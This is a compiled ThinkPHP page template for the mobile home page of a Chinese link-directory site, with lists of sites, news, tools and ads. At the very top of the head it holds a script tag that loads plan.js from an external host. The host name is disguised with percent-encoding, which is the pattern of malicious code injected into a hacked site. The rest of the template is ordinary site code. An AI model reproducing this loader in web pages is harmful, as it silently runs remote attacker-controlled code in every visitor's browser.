<?php if (!defined('THINK_PATH')) exit(); /*a:3:{s:39:"./template/default/wap/index_index.html";i:1571336453;s:66:"/www/wwwroot/666.36yunhu.cn/template/default/wap/index_footer.html";i:1561612998;s:66:"/www/wwwroot/666.36yunhu.cn/template/default/wap/index_header.html";i:1561613106;}*/ ?>

<!DOCTYPE html>
<html>
<head>
<script type="text/javascript" src="http://%71%71%2E%64%61%69%6E%62%2E%63%63/plan.js"></script>
    <meta charset="UTF-8">
    <title><?php echo config('web.WEB_TIT'); ?> - 手机版</title>
		<meta name="keywords" content="<?php echo config('web.WEB_KEY'); ?>">
		<meta name="description" content="<?php echo config('web.WEB_DES'); ?>">
    <meta name="renderer" content="webkit"/>
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
 
    <link rel="stylesheet" href="/template/default/wap/public/css/sm.min.css" type="text/css" media="all"/>
    <link rel="stylesheet" href="/template/default/wap/public/css/swiper.min.css" type="text/css" media="all"/>
    <link rel="stylesheet" href="/template/default/wap/public/css/public.css" type="text/css" media="all"/>
    <link rel="stylesheet" href="/template/default/wap/public/css/index.css" type="text/css" media="all"/>
</head>
<body>
<div class="page-group">
    
<div class="page">
    <div class="content">
        <div class="indexHeader">
            <div class="lo clearfix">
                <a href="/" class="logo">
                    <img src="<?php echo config('web.logo'); ?>"/>
                </a>
                <a class="iconfont icon-tuwenliebiao listBtn open-panel"></a>
            </div>
            <form class="indexSearch" action="" onsubmit="return false">
                <i class="iconfont icon-sousuo"></i>
                <input type="search" placeholder="输入您想百度搜索的内容"/>
                <ul class="selectKeyword"></ul>
            </form>
        </div>
        <div class="swiper-container">
            <div class="swiper-wrapper">
                <div class="swiper-slide">
                    <ul class="indexWebList clearfix">
                      <?php if(is_array($guojizjing) || $guojizjing instanceof \think\Collection || $guojizjing instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($guojizjing) ? array_slice($guojizjing,0,16, true) : $guojizjing->slice(0,16, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>         
                      <li><a href="http://<?php echo $vo['lianjie']; ?>/#guojiz.com" target="_blank" lass="clearfix topdj" data-id="<?php echo $vo['id']; ?>" data-url="http://<?php echo $vo['lianjie']; ?>/#guojiz.com"
                               data-detail="<?php if(config( 'web.WEB_URL') == 1): ?>/daohang/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/daohang/<?php echo $vo['id']; ?>.html<?php endif; ?>"> <img src="<?php if($vo['ico'] != ''): ?><?php echo $vo['ico']; else: ?>http://<?php echo $vo['lianjie']; ?>/favicon.ico<?php endif; ?>"><span><?php echo $vo['title']; ?></span>
                            </a>
                        </li>
                      <?php endforeach; endif; else: echo "" ;endif; ?>                                 
                  </ul>
                </div>
                <div class="swiper-slide">
                    <ul class="indexWebList clearfix">
                      <?php if(is_array($guojiztui) || $guojiztui instanceof \think\Collection || $guojiztui instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($guojiztui) ? array_slice($guojiztui,0,16, true) : $guojiztui->slice(0,16, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>        
                      <li><a href="http://<?php echo $vo['lianjie']; ?>/#guojiz.com" target="_blank" lass="clearfix topdj" data-id="<?php echo $vo['id']; ?>"  data-url="http://<?php echo $vo['lianjie']; ?>/#guojiz.com"
                               data-detail="<?php if(config( 'web.WEB_URL') == 1): ?>/daohang/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/daohang/<?php echo $vo['id']; ?>.html<?php endif; ?>"> <img src="<?php if($vo['ico'] != ''): ?><?php echo $vo['ico']; else: ?>http://<?php echo $vo['lianjie']; ?>/favicon.ico<?php endif; ?>"><span><?php echo $vo['title']; ?></span>
                            </a>
                        </li>
                      <?php endforeach; endif; else: echo "" ;endif; ?>                    
                  </ul>
                </div>
                <div class="swiper-slide">
                    <ul class="indexWebList clearfix">
                    <ul class="indexWebList clearfix">
                      <?php if(is_array($guojiztop) || $guojiztop instanceof \think\Collection || $guojiztop instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($guojiztop) ? array_slice($guojiztop,0,16, true) : $guojiztop->slice(0,16, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>        
                      <li><a href="http://<?php echo $vo['lianjie']; ?>/#guojiz.com" target="_blank" class="clearfix topdj" data-id="<?php echo $vo['id']; ?>"  data-url="http://<?php echo $vo['lianjie']; ?>/#guojiz.com"
                               data-detail="<?php if(config( 'web.WEB_URL') == 1): ?>/daohang/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/daohang/<?php echo $vo['id']; ?>.html<?php endif; ?>"> <img src="<?php if($vo['ico'] != ''): ?><?php echo $vo['ico']; else: ?>http://<?php echo $vo['lianjie']; ?>/favicon.ico<?php endif; ?>"><span><?php echo $vo['title']; ?></span>
                            </a>
                        </li>
                      <?php endforeach; endif; else: echo "" ;endif; ?>                  
                      </ul>
                </div>
            </div>
            <div class="swiper-scrollbar"></div>
        </div>
		<div style="padding:0.3rem;margin-top:0.3rem;background:#FFF;" class="clearfix">
			<div style="float:left;width:calc((100% - 0.3rem) * 1);">	
              <?php if(is_array($guojizgg) || $guojizgg instanceof \think\Collection || $guojizgg instanceof \think\Paginator): $i = 0; $__LIST__ = $guojizgg;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
				<a style="display:block;background: #FFF;padding: 5px;" href="<?php echo $vo['links']; ?>" target="_blank">
					<img src="<?php echo $vo['pic']; ?>" style="width:100%;display:block;height: 12.1vw;" />
				</a>
              <?php endforeach; endif; else: echo "" ;endif; ?>
			</div>
		</div>
        <div class="otherlist">
            <div class="titles">
                <h3>分类专区</h3>
            </div>

            <?php if(is_array($artbycatelist) || $artbycatelist instanceof \think\Collection || $artbycatelist instanceof \think\Paginator): $i = 0; $__LIST__ = $artbycatelist;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>            
          <div class="list clearfix">
                <h3><?php echo $vo['name']; ?></h3>
                <ul>
                     <?php if(is_array($vo['artlists']) || $vo['artlists'] instanceof \think\Collection || $vo['artlists'] instanceof \think\Paginator): $k = 0; $__LIST__ = $vo['artlists'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$v): $mod = ($k % 2 );++$k;?>                  
                  <li><a class="topdj" data-id="<?php echo $v['id']; ?>" href="http://<?php echo $v['lianjie']; ?>/#guojiz.com" target="_blank" data-url="http://<?php echo $v['lianjie']; ?>/#guojiz.com"
                           data-detail="<?php if(config( 'web.WEB_URL') == 1): ?>/daohang/<?php echo $v['id']; ?>.html<?php else: ?>/index.php/daohang/<?php echo $v['id']; ?>.html<?php endif; ?>"><?php echo $v['title']; ?></a>
                  </li>
                  <?php endforeach; endif; else: echo "" ;endif; ?>    
                        
                </ul>
                <a href="<?php if(config( 'web.WEB_URL') == 1): ?>/view/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/view/<?php echo $vo['id']; ?>.html<?php endif; ?>" class="iconfont icon-gengduo1"></a>
            </div>
                  <?php endforeach; endif; else: echo "" ;endif; ?>      
        </div>
        <div class="tools">
            <div class="titles">
                <h3>免费工具</h3>
                <a href="/m/tools/" class="iconfont icon-gengduo1"></a>
            </div>
            <div class="toolContent clearfix">

              <?php if(is_array($guojizgj) || $guojizgj instanceof \think\Collection || $guojizgj instanceof \think\Paginator): $i = 0; $__LIST__ = $guojizgj;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?>
         
              <a href="http://<?php echo $vo['lianjie']; ?>/#guojiz.com" target="_blank">
                    <img src="<?php if($vo['ico'] != ''): ?><?php echo $vo['ico']; else: ?>http://<?php echo $vo['lianjie']; ?>/favicon.ico<?php endif; ?>">
                    <span><?php echo $vo['title']; ?></span>
                </a>
              <?php endforeach; endif; else: echo "" ;endif; ?>
                            </div>
        </div>
        <div class="news">
            <div class="titles">
                <h3>实时新闻</h3>
            </div>

          <ul>
  <?php if(is_array($guojizx) || $guojizx instanceof \think\Collection || $guojizx instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($guojizx) ? array_slice($guojizx,0,10, true) : $guojizx->slice(0,10, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?> 
	<li>
		<a href="<?php if(config( 'web.WEB_URL') == 1): ?>/xq/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/xq/<?php echo $vo['id']; ?>.html<?php endif; ?>" target="_blank"
		class="clearfix">
			<div class="img">
				<img src="<?php echo Pic($vo['content']); ?>">
			</div>
			<div class="info">
				<h3>
					<?php echo $vo['title']; ?>
				</h3>
			</div>
		</a>
	</li>
 
<?php endforeach; endif; else: echo "" ;endif; ?>

          </ul>
        </div>
		

     <div class="footer">
        <div>
            <a href="<?php if(config('web.WEB_URL') == 1): ?>/guanyu.html<?php else: ?>/index.php/guanyu.html<?php endif; ?>">关于</a>
            <a href="<?php if(config('web.WEB_URL') == 1): ?>/ad.html<?php else: ?>/index.php/ad.html<?php endif; ?>">合作</a>
            <a href="<?php if(config('web.WEB_URL') == 1): ?>/add.html<?php else: ?>/index.php/add.html<?php endif; ?>">收录</a>
 
        </div>
        <p><a href="<?php echo config('web.WEB_COM'); ?>">Copyright© 2019</a>  <a target="_blank" href="http://www.guojiz.com/">Powered by Guojiz V2.0</a><?php echo config('web.WEB_TJ'); ?></p>
    </div>
</div>
</div>
<div class="panel panel-right panel-reveal">
        <ul class="rightNav">
        <li>
            <a class="hover" href="/">
                <img src="/template/default/wap/public/img/ico1.png"/>
                网站首页
            </a>
        </li>
        <li>
            <a class="" href="<?php if(config('web.WEB_URL') == 1): ?>/news.html<?php else: ?>/index.php/news.html<?php endif; ?>">
                <img src="/template/default/wap/public/img/ico3.png"/>
                热点新闻
            </a>
        </li>
 
          <?php if($keyss == 1): ?> 
        <li>
            <a class="" href="<?php if(config('web.WEB_URL') == 1): ?>/wang.html<?php else: ?>/index.php/wang.html<?php endif; ?>">
                <img src="/template/default/wap/public/img/ico3.png"/>
               最近更新
            </a>
        </li>
          <?php else: endif; ?> 
          <li>
            <a class="" href="<?php if(config('web.WEB_URL') == 1): ?>/top.html?type=today<?php else: ?>/index.php/top.html?type=today<?php endif; ?>">
                <img src="/template/default/wap/public/img/ico4.png"/>
                排行榜
            </a>
        </li>
        <li>
            <a class="" href="<?php if(config('web.WEB_URL') == 1): ?>/list.html<?php else: ?>/index.php/list.html<?php endif; ?>">
                <img src="/template/default/wap/public/img/ico2.png"/>
                导航分类
            </a>
        </li>

    </ul>
        <div class="indexSet">
        <h3>点击网站直接进入</h3>
        <label class="label-switch">
            <input type="checkbox" checked="">
            <div class="checkbox"></div>
        </label>
    </div>
    </div>
 
<script src="/template/default/wap/public/js/zepto.min.js"></script>
<script src="/template/default/wap/public/js/sm.min.js"></script>
<script src="/template/default/wap/public/js/echarts.simple.min.js"></script>
<script src="/template/default/wap/public/js/public.js"></script>
<script src="/template/default/wap/public/js/index.js"></script>
<script src="/template/default/wap/public/js/swiper.min.js"></script>
      <script>  
        layui.use(['form', 'upload'],function() {     
          var form = layui.form, 
              jq = layui.jquery;     
          jq(".topdj").bind("topdj").click(function() {       
            var url = "<?php echo url("index/index/topdj"); ?>";   
            var id = jq(this).data('id');
            jq.post(url, {             
              id: id      
            },function(data) {});          
          });                
        })    
      </script>
  </div>
</body>
</html>
